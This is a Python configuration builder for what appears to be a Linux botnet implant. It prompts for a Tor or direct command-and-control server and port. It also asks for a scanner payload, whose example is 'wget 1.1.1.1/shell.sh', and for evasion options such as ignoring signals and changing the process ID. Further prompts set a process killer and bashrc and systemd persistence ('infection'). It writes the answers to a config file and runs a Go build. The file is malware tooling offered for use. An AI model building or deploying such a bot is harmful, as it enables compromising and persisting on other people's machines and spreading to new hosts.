
from os import system, chdir
import io



def getinput():
    tor_enabled = input("[1/19] Tor enabled (true/false):\n")
    handleinput(tor_enabled)

    if tor_enabled == "true":

        tor_server = input("[2/19] Tor bot server (ex. she72dnd1e.onion):\n")
        handleinput(tor_server)

        tor_port = input("[3/19] Tor bot port (ex. 80):\n")
        handleinput(tor_port)

        real = input("Use real bot server if the tor server is unavailable? (true/false):\n")
        if real == "true": 
            bot_server = input("[4/19] (Real) Bot server (ex. 127.0.0.1):\n")
            handleinput(bot_server)
            bot_port = input("[5/19] (Real) Bot port (ex. 1929):\n")
            handleinput(bot_port)
        else:
            bot_server = "disable"
            bot_port = "disable"            
    else:
        bot_server = input("[6/19] Bot server (ex. 127.0.0.1):\n")
        handleinput(bot_server)
         
        bot_port = input("[7/19] Bot port (ex. 1929):\n")
        handleinput(bot_port)


    debug = input(
        "[8/19] Debug (true/false):\n")

    handleinput(debug)

    scanner_enabled = input("[9/19] Scanner enabled (true/false):\n")
    handleinput(scanner_enabled)

    if scanner_enabled == "true":
        payload = input(
            "[10/19] Payload (ex. wget 1.1.1.1/shell.sh):\n")

        handleinput(payload)

        scanner_mcpu = input(
            "[11/19] Scanner min cpu count (ex. 3):\n")

        handleinput(scanner_mcpu)
    else:
        payload = "null"
        scanner_mcpu = "0"

    maxcpu_u = input(
        "[12/19] Max cpu usage (ex. 90):\n")

    handleinput(maxcpu_u)

    ignore_signals = input(
        "[13/19] Ignore signals (true/false):\n")

    handleinput(ignore_signals)

    if ignore_signals == "true":
        pid_changer = input(
            "[14/19] Pid changer (true/false):\n")

        handleinput(pid_changer)
    else:
        pid_changer = "false"

    killer_enabled = input(
        "[15/19] Killer enabled (true/false):\n")

    handleinput(killer_enabled)

    if killer_enabled == "true":

        max_killed_pid = input(
            "[16/19] Killer max pid (ex. 100000) (if -1 no limit):\n")

        handleinput(max_killed_pid)

        min_killer_pid = input(
            "[17/19] Killer min pid (ex. 100):\n")

        handleinput(min_killer_pid)
    else:
        max_killed_pid = 0
        min_killer_pid = 0

    bashrc_inf = input(
        "[18/19] Bashrc infection enabled (true/false):\n")

    handleinput(bashrc_inf)

    sysd_inf = input(
        "[19/19] Systemd infection enabled (true/false):\n")

    handleinput(sysd_inf)

    res = f"{bot_server}\\\\{bot_port}\\\\{ignore_signals}\\\\{scanner_enabled}\\\\{scanner_mcpu}\\\\{maxcpu_u}\\\\{pid_changer}\\\\{debug}\\\\{min_killer_pid}|{max_killed_pid}\\\\{killer_enabled}\\\\{bashrc_inf}\\\\{sysd_inf}\\\\{payload}\\\\{tor_server}\\\\{tor_port}\\\\{tor_enabled}"

    chdir("./enc/")

    with io.open(".temp_config", 'w', encoding='utf-8') as file:
       file.write(res)

    system("go run .")  


    # print("==================== CONFIG ====================\n" + res)
    


def handleinput(inp):
    if inp == "":
        print("Invalid input")
        exit(0)


if __name__ == '__main__':
    getinput()
